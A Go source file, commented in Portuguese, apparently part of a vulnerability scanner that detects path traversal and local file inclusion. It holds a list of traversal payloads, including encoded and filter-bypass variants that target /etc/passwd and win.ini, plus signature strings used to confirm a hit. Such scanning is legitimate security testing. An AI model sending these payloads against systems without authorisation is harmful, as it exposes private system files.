package main

import "strings"

// probePayloads são variantes de path traversal tentadas uma a uma por
// (URL, param) até uma trazer a assinatura de um arquivo de sistema (mesma
// lógica "um hit, para" dos outros scanners do repo). Cada uma cobre um
// bypass diferente de filtro — profundidade bruta, strip-once (`....//`),
// barra/ponto URL-encoded (simples e duplo), null byte legado, caminho
// absoluto e a variante Windows. Lê /etc/passwd ou win.ini como PoC; nunca
// escreve nem sai do "provei que dá ler um arquivo arbitrário".
var probePayloads = []string{
	// Linux — /etc/passwd
	"../../../../../../../../etc/passwd",
	"....//....//....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	"..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
	"/etc/passwd",
	"../../../../../../../../etc/passwd%00",
	// Windows — win.ini
	"..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
	"....\\\\....\\\\....\\\\....\\\\windows\\win.ini",
	"..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
	"C:\\windows\\win.ini",
}

// fileSignatures são trechos muito específicos do conteúdo dos arquivos de
// sistema acima — não "a resposta mudou", que seria ruidoso. `root:x:0:0`
// só existe num /etc/passwd de verdade; as marcas de `win.ini`/`boot.ini`
// idem. É isso que torna seguro auto-reportar: uma página de erro genérica
// nunca bate nenhuma destas.
var fileSignatures = []string{
	// /etc/passwd
	"root:x:0:0:",
	"daemon:x:1:1:",
	":/root:/bin/",
	"/usr/sbin/nologin",
	// Windows win.ini
	"[fonts]",
	"; for 16-bit app support",
	"[mci extensions]",
	// boot.ini
	"[boot loader]",
	"operating systems]",
}

// classify decide se o payload provou path traversal/LFI: a assinatura de um
// arquivo de sistema está presente na resposta COM o payload e AUSENTE no
// baseline (sem payload) — esse diferencial descarta páginas que por acaso
// sempre mencionam algo parecido. sev é sempre "high": leitura de arquivo
// arbitrário confirmada por conteúdo real de /etc/passwd ou win.ini é
// reportável de cara, sem tier ambíguo.
func classify(baseline, injected string) (sev, ftype, signature string, ok bool) {
	lowInjected := strings.ToLower(injected)
	lowBaseline := strings.ToLower(baseline)
	for _, sig := range fileSignatures {
		if strings.Contains(lowInjected, sig) && !strings.Contains(lowBaseline, sig) {
			return "high", "path-traversal", sig, true
		}
	}
	return "", "", "", false
}
